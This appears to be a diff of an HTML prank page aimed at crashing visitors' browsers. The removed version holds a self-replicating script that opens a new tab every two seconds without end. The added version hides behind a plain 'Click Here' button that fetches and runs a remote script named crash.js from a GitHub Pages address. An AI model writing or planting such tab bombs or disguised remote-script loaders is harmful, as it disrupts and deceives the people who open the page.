@@ -6,51 +6,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Infinite Tab Opener</title>
+    <title>Load JS on Button Click</title>
 </head>
 <body>
 
-    <button id="open-loop-btn">Start Infinite Loop</button>
+    <!-- Button to trigger the JS file load -->
+    <button type="button" id="run-script-btn">Click Here</button>
 
     <script>
-        document.getElementById('open-loop-btn').addEventListener('click', function() {
-            // Open the first tab
-            var firstTab = window.open();
-            firstTab.document.write(`
-                <html>
-                <head>
-                    <title>New Tab</title>
-                </head>
-                <body>
-                    <h1>New Tab Opened</h1>
-                    <p>This tab will open another tab every 2 seconds.</p>
-                    <script>
-                        function openNewTab() {
-                            var nextTab = window.open();
-                            if (nextTab) { // Check if the popup was not blocked
-                                nextTab.document.write(\`
-                                    <html>
-                                    <head>
-                                        <title>New Tab</title>
-                                    </head>
-                                    <body>
-                                        <h1>New Tab Opened</h1>
-                                        <p>This tab will open another tab every 2 seconds.</p>
-                                        <script>
-                                            setTimeout(openNewTab, 2000); // Open another tab
-                                        <\\/script>
-                                    </body>
-                                    </html>
-                                \`);
-                            } else {
-                                alert("Popup blocked! Please allow popups for this to work.");
-                            }
-                        }
-                        setTimeout(openNewTab, 2000); // Start the loop after 2 seconds
-                    <\\/script>
-                </body>
-                </html>
-            `);
+        document.getElementById('run-script-btn').addEventListener('click', function() {
+            // Create a new script element
+            var script = document.createElement('script');
+            // Set the source to your GitHub Pages JavaScript file
+            script.src = 'https://billylikesbacon.github.io/crash.js'; // Full URL to your JS file
+            // Append the script element to the body
+            document.body.appendChild(script);
         });
     </script>
 
